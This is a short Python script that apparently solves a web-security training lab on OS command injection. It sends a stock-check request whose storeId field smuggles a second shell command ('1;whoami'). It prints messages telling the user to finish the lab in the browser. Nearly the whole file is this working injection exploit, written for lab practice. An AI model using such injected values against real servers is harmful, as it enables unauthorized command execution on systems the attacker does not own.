#!/usr/bin/env python3
import argparse
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


def send_whoami(session: requests.Session, base_url: str):
    stock_url = urljoin(base_url, "/product/stock")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "productId=1&storeId=1;whoami"

    r = session.post(stock_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()

def main():
    parser = argparse.ArgumentParser(
        description="Lab: OS command injection, simple case"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*] Exploiting vulnerability...")
    send_whoami(sess, base_url)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()